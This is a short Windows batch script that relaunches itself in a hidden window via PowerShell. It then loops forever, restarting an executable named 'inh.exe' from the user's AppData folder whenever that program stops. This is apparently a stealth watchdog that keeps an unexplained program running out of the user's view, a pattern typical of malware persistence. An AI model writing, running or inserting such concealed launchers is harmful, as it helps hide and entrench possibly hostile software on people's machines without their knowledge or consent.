@echo off

:: === 1. Relaunch self hidden if not already ===
if "%1" neq "hidden" (
    powershell -windowstyle hidden -command "Start-Process '%~f0' -ArgumentList 'hidden' -WindowStyle Hidden"
    exit
)

:: === 2. Loop to keep inh.exe running silently ===
:l
tasklist /fi "imagename eq inh.exe" | find /i "inh.exe" >nul
if errorlevel 1 (
    timeout /t 5 /nobreak >nul
    start "" "%USERPROFILE%\AppData\inh.exe"
)
goto l
